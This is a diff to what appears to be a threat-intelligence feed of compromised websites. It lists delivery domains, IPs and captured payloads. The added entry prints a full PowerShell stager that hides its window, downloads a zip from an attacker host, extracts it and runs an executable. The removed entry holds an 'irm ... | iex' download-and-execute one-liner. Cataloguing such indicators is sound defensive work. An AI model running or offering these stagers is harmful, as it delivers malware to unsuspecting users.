@@ -1,5 +1,34 @@
 [
   {
+    "UrlDomain": "wpmagazam.com.tr",
+    "DeliveryUrl": [
+      "browse-login.info",
+      "secuius.com"
+    ],
+    "PayloadUrl": [
+      "https://secuius.com/yIY"
+    ],
+    "IP": [
+      "104.21.69.181"
+    ],
+    "Related": [
+      {
+        "Value": "https://secuius.com/tk.js?ver=1.0.1",
+        "Type": "Reference"
+      },
+      {
+        "Value": "https://browse-login.info/api.php?s=6d61d3c4f0ecf193c89fbb37ccc86999b416c0289e00584d&amp;_v=29929017",
+        "Type": "Reference"
+      }
+    ],
+    "Payload": "$url = \"https://secuius[.]com/yIY\";\n$filename = \"Franz.exe\";\n$path = \"$env:TEMP\";\n$archive = Join-Path $path \"d19JSWg2.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
+    "ResolvedDownloadUrl": [
+      "https://secuius.com/yIY"
+    ],
+    "ReportId": "cmwy9vogu0gk80omlqmmdiw5j",
+    "ScannedAt": "2026-11-27T00:58:09.268000+00:00"
+  },
+  {
     "UrlDomain": "lawishinteriordecoration.com",
     "DeliveryUrl": [
       "j7tracker.gb.net"
@@ -4237,31 +4266,5 @@
     ],
     "ReportId": "cmwr7pgt22e9o0omlvwxnrtf0",
     "ScannedAt": "2026-11-22T02:22:56.866000+00:00"
-  },
-  {
-    "UrlDomain": "amadvancedmarketing.com",
-    "DeliveryUrl": [
-      "img-codes-cloude.info"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "93.127.179.134"
-    ],
-    "Related": [
-      {
-        "Value": "https://img-codes-cloude.info/a54d10080461e81a",
-        "Type": "payload download"
-      },
-      {
-        "Value": "https://img-codes-cloude.info/api.php?s=8402fb1338daab6a166e91aa8c92a20798acfa98fb75c5a2&amp;_v=29921815",
-        "Type": "Reference"
-      }
-    ],
-    "Payload": "irm 'img-codes-cloude[.]info/a54d10080461e81a'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://img-codes-cloude.info/a54d10080461e81a"
-    ],
-    "ReportId": "cmwr4m1rl2b0o0omlqujsc9z5",
-    "ScannedAt": "2026-11-22T00:56:18.622000+00:00"
   }
 ]
